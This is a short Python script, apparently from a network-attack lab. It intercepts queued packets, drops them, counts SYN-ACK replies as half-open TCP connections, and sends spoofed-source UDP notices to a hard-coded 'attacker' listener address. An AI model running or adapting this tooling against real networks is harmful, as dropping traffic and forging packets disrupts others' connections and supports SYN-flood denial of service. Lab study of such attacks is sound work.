import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import atexit
from netfilterqueue import NetfilterQueue


LISTENER_HOST = "192.168.1.113" #this is mt ip address and is where i listen the UDP packets
LISTENER_PORT = 49174 #port of the attacker where he is listening



#Type of packet
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
FINACK = 0x11
SYNACK = 0x12
URG = 0x20
ECE = 0x40
CWR = 0x80


def exit_handler():
	print '\n\nThe number of max half tcp connnection is:'+str(counter)

atexit.register(exit_handler)

counter = 0
lst = []

def isANewOne(string):
	for item in lst:
		if string == item:
			return 0
		
	lst.append(string)
	return 1

## Define The Custom Sniffing function
def print_and_accept(packet):
	data = IP(packet.get_payload())
	packet.drop()

	global counter
	if(data.haslayer('TCP')):
		curr_flag = data['TCP'].flags
		if((curr_flag & SYN) and (curr_flag & ACK)):	
			if isANewOne(data[IP].dst) == 1: # let's notify about this packet
				counter += 1
				send(IP(src= data[IP].dst, dst=LISTENER_HOST)/UDP(dport=LISTENER_PORT))
				print 'Packet SYN-ACK #{}: {} ==> {}'.format(counter, data[IP].src, data[IP].dst)
	 
# ## Setup sniff, filtering for IP traffic
# sniff(iface= "enp0s3", filter="tcp and dst port 49173", prn=custom_action)



nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)

try:
	nfqueue.run()
except KeyboardInterrupt:
    print('')
	


nfqueue.unbind()